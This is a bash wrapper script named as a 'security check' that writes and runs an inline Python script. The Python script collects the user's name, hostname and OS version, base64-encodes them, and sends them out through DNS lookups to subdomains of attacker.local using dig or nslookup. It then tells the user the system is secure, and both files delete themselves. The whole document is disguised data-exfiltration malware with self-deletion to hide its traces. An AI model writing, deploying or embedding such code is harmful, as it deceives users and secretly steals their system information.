#!/bin/bash
# SecurityCheck.sh - Wrapper script for SecurityCheck

echo "Initializing Security Check..."
echo "Please wait while we verify your system..."

# Create the Python script inline
cat > /tmp/security_check.py << 'EOF'
#!/usr/bin/env python3
import os
import socket
import platform
import base64
import subprocess

def collect_system_info():
    """Collect basic system information."""
    try:
        user = os.getenv('USER', 'unknown')
        hostname = socket.gethostname()
        os_info = f"{platform.system()}-{platform.release()}"
        
        # Format data
        data = f"user:{user}|host:{hostname}|os:{os_info}"
        return data
    except Exception as e:
        return f"error:{str(e)}"

def send_dns_query(data):
    """Send data via DNS query to attacker.local domain."""
    try:
        # Encode data in base64
        encoded_data = base64.b64encode(data.encode()).decode()
        
        # Split into chunks if needed (DNS labels max 63 chars)
        chunk_size = 50
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            # Create DNS query
            domain = f"chunk{i}.{chunk}.attacker.local"
            try:
                # Use dig command to query
                subprocess.run(['dig', '+short', domain], 
                             capture_output=True, timeout=5)
            except:
                # Fallback to nslookup
                subprocess.run(['nslookup', domain], 
                             capture_output=True, timeout=5)
                
    except Exception as e:
        pass  # Silently fail

def main():
    print("Running system security verification...")
    print("Checking system integrity...")
    
    # Collect and exfiltrate data
    system_data = collect_system_info()
    send_dns_query(system_data)
    
    print("✓ Security check completed successfully")
    print("Your system appears to be secure.")
    
    # Clean up
    try:
        os.remove(__file__)
    except:
        pass

if __name__ == "__main__":
    main()
EOF

# Make the Python script executable and run it
chmod +x /tmp/security_check.py
python3 /tmp/security_check.py

# Clean up this script
rm -f "$0"
